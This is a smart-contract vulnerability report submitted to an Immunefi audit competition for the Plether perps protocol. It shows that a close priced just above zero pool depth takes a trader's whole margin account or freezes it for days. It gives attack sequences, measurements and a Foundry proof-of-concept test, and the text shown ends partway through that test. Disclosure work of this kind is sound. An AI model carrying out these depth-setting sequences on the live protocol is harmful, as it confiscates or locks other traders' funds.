# \#99959 [SC-High] Close price impact has no depth floor: a close at depleted pool depth confiscates the trader's whole margin account or freezes it for days

**Submitted on Nov 15th 2026 at 22:00:22 UTC by @v4rvl for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99959
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

A trader's ordinary full close at a pool depth of 56,264,010 atoms (56.264010 USDG) takes its whole clearinghouse balance. Its cash changes by -99992490996 atoms and it keeps no claim. The same close one lot earlier, at depth 0, leaves it 99,992,490,996 atoms to withdraw and a claim of 26,972,709,004 atoms. With 1,000,000 USDG more free settlement in the account, the cash change is -1099992490996 atoms. With a finite charge bound on the order, the close is refused and the same 99,992,490,996 atoms stay locked through 7 days of marks. In a pool that was never degraded and holds no trader claims, a 10-lot minority close pays 9,962,348 atoms of price impact instead of 3,911,183 at price 1.00, and at price 1.98 the trader loses its whole account (cash change -1006941136 atoms against -8525196 in the control).

The fresh VPI charge of a close is `k * (S_post^2 - S_pre^2) / (2D)`. `D` is the pool's economic depth: pool assets minus outstanding trader claims, floored at zero. The engine skips this charge only when `D == 0` exactly, to "keep protective exits live". At any `D >= 1` atom the full curve applies, so the charge jumps from zero to millions of USDG one lot above the exemption. The close planner collects the charge from the account's realized gain, its margin, its action reserve and its **entire free settlement balance**. That balance is money the trader holds in the clearinghouse but has not put at risk in the position. While the engine is in degraded mode, an account with an open position cannot withdraw that free balance first.

Any account can set `D` to within one lot of zero with an ordinary close of its own:
- a winner sizes its profit-taking close so the cash payout leaves one lot of depth
- or, while claims exceed pool assets, a loser closes just enough lots to cover the deficit.

The next trader who closes on the minority side then loses one of two things:
- with no finite `maxActionChargeAssets` on the order, its whole clearinghouse balance
- with a finite bound, nothing at first: the close is refused, and its whole balance stays locked for as long as the depth stays small. Nothing moves the depth unless some other party acts.

Measured on the repository's own fixture, at the pinned commit, with public calls only:

- **Whole balance.** The pool is short of its claims. A loser covers the deficit, leaving D = 56.264010 USDG. The victim's ordinary close of a 30,000-unit short that is 27,000 USDG in profit is charged 4,257,776.863043 USDG of VPI.
  - The victim loses its whole account: -99,992.490996 USDG.
  - Control: the same close one lot earlier, at D = 0. The victim keeps 99,992.490996 USDG and is owed a 26,972.709004 USDG claim.
  - With 1,000,000 USDG more free settlement in the account, it loses -1,099,992.490996 USDG.
- **Winner sets the depth, no prior claim.** The large winner takes its profit in a sized close (payout in cash, D left at 1,269.718366 USDG). The victim's close follows.
  - Victim: -126,965.2 USDG versus the honest order.
  - Winner: 506,419.089446 USDG in cash and no claim. In the honest order it ended with a 511,673.487903 USDG claim against 427,408.896198 USDG of pool assets, so the pool could not settle it (claim settlement is all-or-nothing, `packages/perps/ACCOUNTING_SPEC.md:770`) until it gained another 511,673.487903 - 427,408.896198 = 84,264.591705 USDG.
  - The LP side gains 133,965.514188 USDG.
  - Every party's ATTACK minus CONTROL sums to 0.
- **Bounded order: frozen.** The same victim with `maxActionChargeAssets = 1,000 USDG`: the close is refused (`ConstraintViolation`) now, after 24 hours and after 7 days of hourly marks.
  - The free balance cannot be withdrawn (`CfdEngine__DegradedMode`).
  - D stays at 56.264010 USDG throughout.
  - It ends only when another trader closes a losing position. In the control, the same bounded close executes and the victim withdraws 99,992.490996 USDG at once.

**The same charge without degraded mode.** The cause is wider than the neighbourhood of zero. Opens are admitted only while skew <= 40 % of `D` (the release `maxSkewRatio`), which bounds the price impact of any trade at about `k * maxSkewRatio` = 0.4 % of notional. LP redemptions lower `D` afterwards and reserve only the book's maximum liability, not the depth the skew was admitted against. A close is then priced at a depth no open would have been admitted at. Measured in a pool that was never degraded, has no trader claims and had no owner call after configuration (second test):

- **Ordinary price 1.00.** The junior LP that holds the short book redeems to its cap through ordinary 1-hour epochs. A 1,000 USDG minority close then pays 9.962348 USDG of VPI (99 bp) instead of 3.911183 USDG (39 bp). The redeeming LP ends 6.954520 USDG better than in the control, from this one small close.
- **Price 1.90.** The same close pays 359.214025 USDG (18.9 % of its notional, more than its 200 USDG margin). Victim -359.975623 USDG against -8.183315 USDG in the control. The redeeming LP gains 364.016655 USDG.
- **Price 1.98.** The victim loses its whole 1,000 USDG account (-1,006.941136 USDG). The rest of the 1,948.555894 USDG charge is waived.
- **Bounded order.** With `maxActionChargeAssets = 10 USDG` at 1.90, the close is refused now and after 1, 7 and 30 days. The trader cannot close at all until new LP deposits restore depth.
- **The market cannot trade the skew back.** After the redemptions the pool holds little more than its reserve. A skew-reducing open would be paid a rebate from pool cash, so every size (10, 50, 200, 1,000 lots) is refused at commit with `SOLVENCY_EXCEEDED`. A skew-increasing open is refused with `SKEW_TOO_HIGH`. In the control all of them execute. The inflated charge lasts until a new LP deposit of about the redeemed size activates.

## Vulnerability Detail

### Root cause

1. The fresh close VPI is skipped only at exactly zero depth. `packages/perps/src/libraries/CloseAccountingLib.sol:105-110`:

```solidity
        // With no economic depth, keep protective exits live without creating a fresh charge or rebate.
        // The lifetime clamp below still recovers any previously received negative VPI.
        if (inputs.poolDepthAssets != 0) {
            state.vpiDeltaAssets = CfdMath.calculateVPI(
                inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
            );
        }
```

2. The curve is `k * S^2 / (2D)` with no bound as `D -> 0+`. `packages/perps/src/CfdMath.sol:129-139`:

```solidity
        uint256 skewWad = skewAssets * 1e12;
        uint256 depthWad = depthAssets * 1e12;
        ...
        uint256 sqSkewOverDepthWad = (skewWad * skewWad) / depthWad;
        ...
        uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2;
        return (true, costWad / 1e12);
```

3. `D` is pool assets net of trader claims. `packages/perps/src/libraries/CfdEnginePlanLib.sol:1339-1341` calls `computeNetPoolDepthAssets(snap.poolAssets, snap.totalTraderClaimBalanceAssets)`, and `packages/perps/src/libraries/PositionRiskAccountingLib.sol:21-26` returns `physicalAssets > traderClaimsAssets ? physicalAssets - traderClaimsAssets : 0`.
   - Every realized loss raises `D` by its amount.
   - Every fresh payout and every recorded claim lowers it.
   - A trader therefore sets `D` to within one lot by choosing the size of its own close.

4. A positive VPI becomes an action charge. It is collected from the price gain first, then from every cash source of the account, including all free settlement. `packages/perps/src/libraries/CfdEnginePlanLib.sol:1041-1058` and `:1093-1133`:

```solidity
        int256 actionNetAssets = cs.vpiDeltaAssets
            + int256(cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets);
        ...
            delta.actionChargeWithheldAssets = delta.priceGainAssets < delta.actionChargeAssessedAssets
                ? delta.priceGainAssets : delta.actionChargeAssessedAssets;
        ...
        uint256 collectibleFreeSettlementAssets = snap.accountBuckets.freeSettlementAssets + releasedVpiReserveAssets;
        ...
        uint256 freeConsumedAssets = actionChargeAfterReserveAssets < collectibleFreeSettlementAssets
            ? actionChargeAfterReserveAssets : collectibleFreeSettlementAssets;
```

   The function's own documentation (`CfdEnginePlanLib.sol:790-792`) lists "new price gain, dedicated VPI backing, spendable action reserve, free settlement, safely released pledge". Only the remainder above all of these is waived on a full close.

5. In degraded mode an account with an open position cannot withdraw its free balance before closing. `packages/perps/src/CfdEngineSettlementSidecar.sol:274-276`:

```solidity
        if (engine.degradedMode()) {
            revert ICfdEngineTypes.CfdEngine__DegradedMode();
        }
```

   Depth near zero always implies degraded mode: the latch is set when cash net of claims falls below maximum liability (`CfdEngine.sol:1353-1368`).

6. A trader can bound the action charge per order (`ExecutionBounds.maxActionChargeAssets`, enforced at `CfdOrderPolicyEvaluatorBase.sol:509-513` on a charge that includes the close VPI, `:412-414`). With a bound, the close fails instead of executing. Steps 4 and 5 then leave the whole account locked until some other party raises `D`.

7. Opens tie skew to depth. Nothing keeps the tie afterwards. `packages/perps/src/libraries/CfdEnginePlanLib.sol:473-480`:

```solidity
        uint256 maxSkewAssets = Math.mulDiv(netDepthAssets, snap.riskParams.maxSkewRatio, CfdMath.WAD);
        if (
            inputs.postSkewAssets > maxSkewAssets
                && (inputs.postSkewAssets >= inputs.preSkewAssets || orderSideIsPostOpenHeavy)
        ) {
            delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH;
            return;
        }
```

   The redemption reserve and the open-side solvency check then lock the state in. A skew-reducing open receives its rebate from pool cash and must leave the settlement buffer intact (`CfdEnginePlanLib.sol:729-734`, `:770-772`). At a pool redeemed to its reserve it does not, so the opens that would lower the skew are refused.

   A junior redemption is capped by `_juniorSettlementCapacity` (`packages/perps/src/HousePool.sol:1205-1217`): `min(freeAssets, juniorPrincipal, ratioCap)`, where free assets set aside the book's maximum liability. Maximum liability is `n * entry` for one side and `n * (CAP - entry)` for the other (`CfdMath.sol:76-90`). It is not `skew / maxSkewRatio`. After redemptions to that cap, `D` is about the maximum liability, and the close charge per unit of notional is about `k * skew / D`: 1 % at price 1.00 (2.5 times the admitted bound), and without bound as the majority's entry price approaches the cap. Closes have no skew or depth admission of their own.

### History of the guard

The zero-depth branch was added together with claim-net depth, in the commit "fix(perps): use net risk depth and fingerprint calendar changes (#118)" ("Subtract outstanding trader claims consistently in carry, skew limits, VPI ... and define zero-depth admission and close behavior"). That commit fixed the 2026-10-15 scan item "Deferred trader claims inflate open skew capacity and reduce VPI". Subtracting claims is what lets `D` reach a few USDG while positions are open. The guard added in the same fix covers only `D == 0`, so one atom above it the protective-exit rule it states does not hold.

## Impact

Program impact rows claimed, quoted from the program's list:
- Critical: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield"
- High: "Temporary freezing of funds for at least 24 hours"

First test (victim frank, amounts in USDG):

| arm | depth D at the victim's close | victim, control | victim, attack | where it goes |
|---|---|---|---|---|
| Claim path, ordinary close | 56.264010 | keeps 99,992.490996 + claim 26,972.709004 | -99,992.490996 (whole account) | pool |
| Claim path, +1,000,000 free settlement | 56.264010 | not run (the arm 0 control close leaves free settlement untouched) | -1,099,992.490996, the whole account: 1,000,000 + 99,992.490996 = 1,099,992.490996 | pool |
| Winner sets D, no claim | 1,269.718366 | +26,972.709004 cash | -99,992.490996 (-126,965.200000 vs control) | LP side +133,965.514188, winner's 511,673.487903 claim becomes 506,419.089446 cash |
| Bounded order (1,000 USDG) | 56.264010 for 7 days | closes, withdraws 99,992.490996 | 99,992.490996 locked, close refused | none (frozen) |
| Protection, unlimited limits | 56.264010 | (as first row) | whole account, 99,992.490996 lost | pool |
| Claimant settles, then closes | 56.264010 | close first, then settle: -200,663.810904 | -689,715.944605, that is 689,715.944605 - 200,663.810904 = 489,052.133701 worse | pool |

Second test, never-degraded pool, no claims (victim is a 10-lot long, 1,000 USDG funded):

| price | depth D at the victim's close (USDG) | close VPI, control | close VPI, attack | victim, attack vs control (USDG) | redeeming LP that holds the short book (USDG) |
|---|---|---|---|---|---|
| 1.00 | 393,682.29 | 3.91 (39 bp) | 9.96 (99 bp) | -10.36 vs -4.31 | +6.95 |
| 1.50 | 131,229.53 | 5.86 (39 bp) | 44.80 (298 bp) | -45.40 vs -6.46 | +42.67 |
| 1.90 | 20,722.52 | 7.42 (39 bp) | 359.21 (1,890 bp) | -359.98 vs -8.18 | +364.02 |
| 1.98 | 3,979.62 | 7.73 (39 bp) | 1,948.56 assessed | -1,006.94 (whole account) vs -8.53 | +865.47 |

**How the numbers fit together.**
- frank's 30,000-unit short is 27,000 USDG in profit at 1.90 (realized PnL 27,000.000000 USDG in the preview). The close VPI at D = 56.264010 USDG is 4,257,776.863043 USDG.
- The planner withholds the whole 27,000.000000 USDG gain, collects the account's entire 99,992.490996 USDG balance, and waives the rest.
- In the control (D = 0) there is no fresh VPI. The fee and the clawback of the rebate received at open come out of the gain, and the rest becomes a claim: 27,000.000000 - 22.800000 - 4.490996 = 26,972.709004 USDG.
- In the winner arm, frank ends 126,965.200000 USDG worse than in the control, gina 1,747.421088 USDG worse, and the winner's face value (cash plus claim) is 5,252.893100 USDG lower. Their sum is the LP side's gain: 126,965.200000 + 1,747.421088 + 5,252.893100 = 133,965.514188 (the sum of all deltas is asserted zero).
- What the winner gains is payment, not face value. In the control the pool ends with 427,408.896198 USDG of assets against the winner's 511,673.487903 USDG claim.
- So in the control this part of its winnings cannot be paid: 511,673.487903 - 427,408.896198 = 84,264.591705 USDG.
- In the attack the victims' balances are in the pool, the winner holds 506,419.089446 USDG in cash and no claim, and the pool keeps 49,700.922483 USDG.

**Why the control isolates the cause.** Each control runs the same accounts, the same orders and the same final price. Only the depth at the victim's close differs: 0 versus one lot above 0. The protocol itself treats `D = 0` as "no fresh charge" (`packages/perps/src/libraries/CloseAccountingLib.sol:105`), so the loss is the discontinuity, not the market move.

**Mapping to the program rows.**
- "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield": the victim's free settlement is at-rest user funds that its position never put at risk. It moves to the pool by a public sequence in which another account chooses the depth. In the winner arm, that account receives cash it could not otherwise obtain.
- The same row for the never-degraded pool: the party that redeems is the party that receives. An LP that holds the majority book redeems to the cap at no cost beyond the epochs. Every minority close that follows pays it 2.5 times the admitted price impact at an ordinary price, and the position's whole margin near the cap.
- "Temporary freezing of funds for at least 24 hours": for a victim that bounds its order. Its 99,992.490996 USDG stays locked through 7 days of marks (measured), and only another party's action ends it.

**Severity.** Critical is claimed for the arms where the victim's order carries no finite charge bound, because the balance leaves the victim. Where the victim bounds its order, the measured outcome is the High row (the freeze). The direct beneficiary of the confiscation is the pool side, and the account that sets the depth gains payment of winnings rather than face value (see Limits).  

## Limits

- **Duration of the never-degraded arm.** It ends when new LP capital of about the redeemed size is deposited and activates (measured: 400,000 USDG at price 1.00 and 800,000 USDG at 1.90 bring the charge back under 50 bp). Trading cannot end it, because rebalancing opens are refused in that state.
- **Never-degraded arm.** At an ordinary price the excess is 99 - 39 = 60 bp of the close's notional. It exceeds 5 % of notional only at prices between the measured 1.50 (298 bp) and 1.90 (1,890 bp), and the position's 200 USDG margin only near 1.90 (359.214025 USDG charged), with the majority book entered there. The redeeming LP must hold most of the junior tranche. The charge of that arm is collected from the position's margin, reserve and gain. Free settlement can be withdrawn first while the engine is not degraded.
- **State (degraded arms).** It needs a pool close to exhausted: a large one-sided winner, LPs redeemed to their cap, and a price path that pays one side and then the other. The whitepaper states this sequential path is reachable and not reserved for (`packages/perps/WHITEPAPER.md:272-279`: "Reserving 1 at inception did not fund this sequential path"). D near zero always comes with degraded mode.
- **Order bound.** A victim whose order carries a finite `maxActionChargeAssets` is not confiscated. Its close is refused, and its harm is the freeze above. The repository's own fork test and most of its protection tests pass `type(uint256).max` (`test/fork/PerpsFork.t.sol:300`, and 23 of 31 `CloseFinancialLimits` in `packages/perps/test`). The integration guide leaves the bound to the user's policy (`packages/perps/WORKING_WITH_AI_AGENTS.md:90-91`).
- **Ordering.** Orders execute in FIFO. The account that sets D cannot jump a close already queued. It sets D first, and the next minority-side close is hit, including keeper-triggered take-profit closes.
- **Honest twin.** An honest winner taking profit, or an honest loser closing, can leave D small by chance, and the next honest closer suffers the same loss. The defect is in the pricing. A deliberate actor only removes the chance.
- **Repetition.** Each confiscation raises D by the amount taken. A further victim is charged heavily only if someone lowers D again. In the winner arm, the winner's remaining gain was too small, and the second victim lost 1,747.421088 USDG.
- **Partial closes** are refused by the post-close health check at this depth. Liquidations compute no fresh VPI.

## References

- Target: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- Code: `packages/perps/src/libraries/CloseAccountingLib.sol:105-110`, `packages/perps/src/CfdMath.sol:129-139`, `packages/perps/src/libraries/CfdEnginePlanLib.sol:473-480`, `packages/perps/src/libraries/CfdEnginePlanLib.sol:1041-1058`, `packages/perps/src/libraries/CfdEnginePlanLib.sol:1093-1133`, `packages/perps/src/CfdEngineSettlementSidecar.sol:274-276`, `packages/perps/src/HousePool.sol:1205-1217`.

### Relation to the documentation

- `packages/perps/SECURITY.md:1438-1440` (Known Limitations, VPI): "VPI depends on live canonical assets net of outstanding trader claims", and "Protective closes create no fresh VPI charge or rebate at zero depth".
- `packages/perps/ACCOUNTING_SPEC.md:665-669`: "Protective closes and liquidations remain available ... A zero-depth close creates no fresh VPI charge or rebate".
- `packages/perps/SECURITY.md:1505`, the degraded runbook: "Let closes and liquidations continue".

These promise a live, uncharged exit at zero depth. None states that one atom above zero the same close costs many times its notional and the trader's unrelated free balance.

### Relation to earlier findings

- The 2026-10-15 scan item "Deferred trader claims inflate open skew capacity and reduce VPI" was fixed by subtracting claims from depth and adding the zero-depth branch (#118). This report shows that fix is incomplete: the exemption covers `D == 0` only, while claim-net depth now reaches a few USDG.
- The scan item "Temporary pool liquidity can reduce a skew-increasing close charge" is the opposite direction (raising D to lower one's own charge).

## Proof of Concept

## Proof of Concept

### Steps to reproduce (first test)

Book: release risk configuration (VPI factor 1 %, skew limit 40 %, fee 4 bp). Junior LP is the fixture's 1,000,000 USDG depositor (bob).

1. At price 1.00: carol LONG 300,000 units, dave SHORT 300,000 + 270,000 = 570,000, erin LONG 300,000 (300,000 USDG margin), frank SHORT 30,000, gina SHORT 20,000 (`OrderRouter.commitOrder` and `executeOrder`).
2. bob redeems junior shares up to his own `getPendingTrancheState().maxJuniorWithdrawAssets` (`requestRedeem`, `settleLpEpoch`, `claimRedeem`).
3. Mark 0.50: carol closes in profit and is paid in cash.
4. Mark 1.90.
5. Then one of two paths:
   - **Winner path (test 2):** dave closes `floor(D / gainPerLot)` lots. The payout is cash and leaves D one lot above zero.
   - **Claim path (tests 1, 3-5):** dave closes more than the free cash and receives a claim (D = 0). Then erin closes `deficit / lossPerLot + 1` lots, leaving D one lot above zero.
6. frank closes his whole position with an ordinary close order.

### First test: degraded pool, depth one lot above zero

Save the file below as `packages/perps/test/perps/TinyDepthCloseVpi.t.sol` and run, from `packages/perps`:

```
forge test --match-path test/perps/TinyDepthCloseVpi.t.sol -vv
```

The test uses the repository's `OrderRouterPythTestBase` fixture and the production V3 entrypoint `OrderRouter.commitOrder(OrderRequest)` with explicit `ExecutionBounds`.
- Owner calls: the release risk configuration in setup only.
- Tokens: minted only to fund accounts before they deposit.
- No storage writes, no mocked calls.

Every arm is compared with a control on the same timeline at the same final price.

Full source of `packages/perps/test/perps/TinyDepthCloseVpi.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

import {console2} from "forge-std/console2.sol";

import {OrderRouterPythTestBase} from "./shared/OrderRouterTestBase.sol";

/// A voluntary close priced at a small positive economic depth D = pool assets - trader claims is charged
/// k * (S_post^2 - S_pre^2) / (2D) of VPI (skipped only at D == 0) and the charge is collected from the account's
/// realized gain, margin and entire free settlement. Public entrypoints only; tokens are minted only to fund accounts.
contract TinyDepthCloseVpiTest is OrderRouterPythTestBase {
    address internal keeper = address(0x4EE9);
    address internal carol = address(0xCA201); // long, paid on the fall
    address internal dave = address(0xDA7E); // large short winner
    address internal erin = address(0xE41); // large long, loser at 1.90
    address internal frank = address(0xF4A2); // victim: small short winner
    address internal gina = address(0x61A); // second victim: small short winner

    uint256 internal constant T0 = SETUP_TIMESTAMP + 10 hours;
    uint256 internal now_;
    int64 internal px;
    IPositionProtectionActions internal book;

    // ------------------------------------------------------------------ fixture helpers
    function _release() internal {
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8_000;
        pc.seniorRateBps = 800;
        pool.proposePoolConfig(pc);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        ICfdEngineAdminHost.EngineRiskConfig memory config;
        config.riskParams = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
        config.executionFeeBps = 4;
        config.frozenCloseSpreadBps = 50;
        config.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
    }

    function _blob(int64 price, uint256 t, uint256 tPrev) internal pure returns (bytes[] memory d) {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(FEED_A, MockPyth.MockPrice(price, 0, int32(-8), t, tPrev));
        u[1] = MockPyth.FeedUpdate(FEED_B, MockPyth.MockPrice(price, 0, int32(-8), t, tPrev));
        d = new bytes[](1);
        d[0] = abi.encode(u);
    }

    function _tick(uint256 dt) internal {
        now_ += dt;
        vm.warp(now_);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _mark() internal {
        _tick(2);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(keeper);
        router.updateMarkPrice(b);
    }

    function _setPx(int64 p) internal {
        px = p;
        _mark();
    }

    function _fund(address who, uint256 amt) internal {
        settlementToken.mint(who, amt);
        vm.startPrank(who);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(who, amt);
        vm.stopPrank();
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 maxCharge)
        internal
        view
        returns (OrderV3Types.OrderRequest memory req)
    {
        req = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(now_, size, margin, isClose, gasleft())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: maxCharge,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// Commit through the production V3 entrypoint and self-execute one block later at the current price.
    function _trade(address a, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 maxCharge)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        if (engine.lastMarkTime() + 40 < now_) _mark();
        _tick(1);
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose, maxCharge);
        vm.prank(a);
        uint64 id = router.commitOrder(req);
        _tick(2);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(a);
        r = router.executeOrder(id, b);
    }

    function _must(address a, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        OrderV3Types.ExecutionResult memory r = _trade(a, side, size, margin, isClose, type(uint256).max);
        require(r.status == OrderV3Types.LifecycleStatus.Executed, "trade not executed");
    }

    function _size(address a) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _cash(address a) internal view returns (int256) {
        return int256(settlementToken.balanceOf(a) + clearinghouse.balanceAssets(a));
    }

    function _claim(address a) internal view returns (int256) {
        return int256(engine.traderClaimBalanceAssets(a));
    }

    function _depth() internal view returns (int256) {
        return int256(pool.totalAssets()) - int256(engine.totalTraderClaimBalanceAssets());
    }

    /// Pool side of the ledger: pool and vault tokens minus what the pool owes as trader claims.
    function _poolSide() internal view returns (int256) {
        return int256(settlementToken.balanceOf(address(pool)) + settlementToken.balanceOf(address(juniorVault))
            + settlementToken.balanceOf(address(seniorVault))) - int256(engine.totalTraderClaimBalanceAssets());
    }

    function _treasury() internal view returns (int256) {
        address t = engine.protocolTreasury();
        return int256(settlementToken.balanceOf(t) + clearinghouse.balanceAssets(t));
    }

    /// Book: carol LONG 300k units, dave SHORT 570k, erin LONG 300k (300k margin), frank SHORT 30k, gina SHORT 20k, all
    /// at 1.00. Junior LP bob redeems to his own withdrawal cap. Mark 0.50: carol takes profit (paid in cash).
    /// Mark 1.90. If `withClaim`, dave closes more than the free pool cash and receives a trader claim.
    function _build(bool withClaim) internal {
        _release();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        now_ = T0;
        vm.warp(now_);
        _setPx(100_000_000);
        _fund(carol, 100_000e6);
        _fund(dave, 200_000e6);
        _fund(erin, 400_000e6);
        _fund(frank, 100_000e6);
        _fund(gina, 100_000e6);
        _must(carol, CfdTypes.Side.LONG, 300_000e18, 30_000e6, false);
        _must(dave, CfdTypes.Side.SHORT, 300_000e18, 30_000e6, false);
        _must(erin, CfdTypes.Side.LONG, 300_000e18, 300_000e6, false);
        _must(dave, CfdTypes.Side.SHORT, 270_000e18, 30_000e6, false);
        _must(frank, CfdTypes.Side.SHORT, 30_000e18, 50_000e6, false);
        _must(gina, CfdTypes.Side.SHORT, 20_000e18, 50_000e6, false);
        // junior LP redeems up to its own cap (public, one epoch)
        (,,, uint256 maxJ) = pool.getPendingTrancheState();
        uint256 shares = juniorVault.balanceOf(bob) * (maxJ * 10_000 / pool.juniorPrincipal() - 1) / 10_000;
        _mark();
        vm.prank(bob);
        uint256 id = juniorVault.requestRedeem(shares, bob, bob);
        now_ = pool.lpEpochStart(id) + 30;
        vm.warp(now_);
        _tick(1);
        bytes[] memory b = _blob(px, now_ - 1, now_ - 2);
        vm.prank(keeper);
        router.settleLpEpoch(b);
        _mark();
        uint256 c = juniorVault.claimableRedeemRequest(id, bob);
        vm.prank(bob);
        juniorVault.claimRedeem(id, c, bob, bob);
        _setPx(50_000_000);
        _must(carol, CfdTypes.Side.LONG, 300_000e18, 0, true);
        _setPx(190_000_000);
        if (!withClaim) return;
        uint256 lots = uint256(_depth()) / 90_000_000 + 200;
        _must(dave, CfdTypes.Side.SHORT, lots * 100e18, 0, true);
        require(engine.traderClaimBalanceAssets(dave) > 0, "no claim");
    }

    /// erin (loser) closes the smallest number of 100-unit lots whose loss covers the claims deficit: D lands one
    /// lot above zero.
    function _erinCoversDeficit() internal {
        int256 deficit = -_depth();
        uint256 es = _size(erin);
        int256 pnl = engineLens.previewClose(erin, es, uint256(uint64(px))).realizedPnlAssets;
        uint256 lossPerLot = uint256(-pnl) * 100e18 / es;
        uint256 lots = uint256(deficit) / lossPerLot + 1;
        _must(erin, CfdTypes.Side.LONG, lots * 100e18, 0, true);
    }

    /// A short winner closes the number of lots whose fresh cash payout leaves D at most one lot of gain.
    function _sizedWinnerClose(address w) internal returns (bool done) {
        uint256 ws = _size(w);
        int256 pnl = engineLens.previewClose(w, ws, uint256(uint64(px))).realizedPnlAssets;
        uint256 gainPerLot = uint256(pnl) * 100e18 / ws;
        uint256 lots = uint256(_depth()) / gainPerLot;
        if (lots * gainPerLot == uint256(_depth())) lots -= 1;
        if (lots == 0 || lots * 100e18 >= ws) return false;
        _must(w, CfdTypes.Side.SHORT, lots * 100e18, 0, true);
        return true;
    }

    function _logPreview(string memory tag, address a) internal view {
        ICfdEngineTypes.ClosePreview memory p = engineLens.previewClose(a, _size(a), uint256(uint64(px)));
        console2.log(tag);
        console2.log("  D (pool assets - claims):");
        console2.logInt(_depth());
        console2.log("  preview valid / fee / vpiAssets", p.valid, p.executionFeeAssets, p.vpiAssets);
        console2.log("  preview vpiDelta / realizedPnl:");
        console2.logInt(p.vpiDeltaAssets);
        console2.logInt(p.realizedPnlAssets);
        console2.log("  preview immediatePayout / claim / toFreeSettlement", p.immediatePayoutAssets, p.traderClaimBalanceAssets, p.payoutToFreeSettlementAssets);
    }

    // ------------------------------------------------------------------ tests

    /// 1. Whole balance. Claims exceed pool assets (D = 0). Control: frank closes and withdraws. Attack: erin's loss
    /// first covers the deficit (D = one lot), then frank closes. Third arm: frank holds 1,000,000 USD more free
    /// settlement.
    function test_1_wholeBalanceAtTinyDepth() public {
        _build(true);
        _logPreview("frank close preview, claims > assets (control state)", frank);
        int256 k0 = _claim(frank);
        for (uint256 arm; arm < 3; ++arm) {
            uint256 snap = vm.snapshotState();
            uint256 n = now_;
            if (arm == 2) _fund(frank, 1_000_000e6);
            int256 start = _cash(frank);
            if (arm > 0) {
                _erinCoversDeficit();
                _logPreview("frank close preview after erin covers the deficit", frank);
            }
            _must(frank, CfdTypes.Side.SHORT, _size(frank), 0, true);
            uint256 free = clearinghouse.getFreeBuyingPowerAssets(frank);
            vm.prank(frank);
            clearinghouse.withdraw(frank, free);
            console2.log("ARM (0 control, 1 tiny D, 2 tiny D + 1M free settlement)", arm);
            console2.log("  frank cash delta / claim delta / withdrawn:");
            console2.logInt(_cash(frank) - start);
            console2.logInt(_claim(frank) - k0);
            console2.log(free);
            if (arm > 0) {
                assertEq(clearinghouse.balanceAssets(frank), 0, "whole clearinghouse balance taken");
                assertEq(_claim(frank), 0, "no claim");
            }
            vm.revertToState(snap);
            now_ = n;
            vm.warp(now_);
        }
    }

